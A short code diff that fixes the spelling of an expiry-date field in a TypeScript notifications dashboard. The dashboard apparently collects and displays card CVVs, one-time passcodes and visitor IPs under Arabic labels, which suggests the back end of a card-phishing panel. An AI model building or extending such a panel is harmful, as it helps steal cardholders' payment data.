@@ -114,7 +114,7 @@ interface Notification {
   ip?: string;
   cvv?: string;
   id: string | "0";
-  expiaryDate?: string;
+  expiryDate?: string;
   notificationCount: number;
   otp?: string;
   otp2?: string;
@@ -2058,7 +2058,7 @@ export default function NotificationsPage() {
                     value:
                       selectedNotification.year && selectedNotification.month
                         ? `${selectedNotification.year}/${selectedNotification.month}`
-                        : selectedNotification.expiaryDate,
+                        : selectedNotification.expiryDate,
                   },
                   { label: "رمز الأمان", value: selectedNotification.cvv },
                   { label: "رمز التحقق", value: selectedNotification.otp },
